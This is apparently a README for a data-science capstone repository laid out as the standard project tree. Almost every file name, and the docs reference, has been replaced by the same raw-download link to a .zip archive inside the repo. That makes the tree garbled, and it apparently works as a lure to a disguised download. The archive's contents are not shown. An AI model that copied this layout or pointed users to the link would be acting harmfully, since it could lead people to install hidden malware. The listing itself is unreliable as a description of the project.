DS4A-Capstone
==============================
Chris Cross, Merian Gabra, Elizabeth Nyami, Ryan Jamison, Matewos Sebsibe
Capstone Project for DS4A

Project Organization
------------

    ├── LICENSE
    ├── Makefile           <- Makefile with commands like `make data` or `make train`
    ├── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip          <- The top-level README for developers using this project.
    ├── data
    │   ├── external       <- Data from third party sources.
    │   ├── interim        <- Intermediate data that has been transformed.
    │   ├── processed      <- The final, canonical data sets for modeling.
    │   └── raw            <- The original, immutable data dump.
    │
    ├── docs               <- A default Sphinx project; see https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip for details
    │
    ├── models             <- Trained and serialized models, model predictions, or model summaries
    │
    ├── notebooks          <- Jupyter notebooks. Naming convention is a number (for ordering),
    │                         the creator's initials, and a short `-` delimited description, e.g.
    │                         `1.0-jqp-initial-data-exploration`.
    │
    ├── references         <- Data dictionaries, manuals, and all other explanatory materials.
    │
    ├── reports            <- Generated analysis as HTML, PDF, LaTeX, etc.
    │   └── figures        <- Generated graphics and figures to be used in reporting
    │
    ├── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip   <- The requirements file for reproducing the analysis environment, e.g.
    │                         generated with `pip freeze > https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip`
    │
    ├── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip           <- makes project pip installable (pip install -e .) so src can be imported
    ├── src                <- Source code for use in this project.
    │   ├── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip    <- Makes src a Python module
    │   │
    │   ├── data           <- Scripts to download or generate data
    │   │   └── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
    │   │
    │   ├── features       <- Scripts to turn raw data into features for modeling
    │   │   └── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
    │   │
    │   ├── models         <- Scripts to train models and then use trained models to make
    │   │   │                 predictions
    │   │   ├── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
    │   │   └── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
    │   │
    │   └── visualization  <- Scripts to create exploratory and results oriented visualizations
    │       └── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
    │
    └── https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip            <- tox file with settings for running tox; see https://github.com/olu-ds/DS4A-Capstone/raw/refs/heads/main/data/interim/D-Capstone-v1.0-beta.5.zip
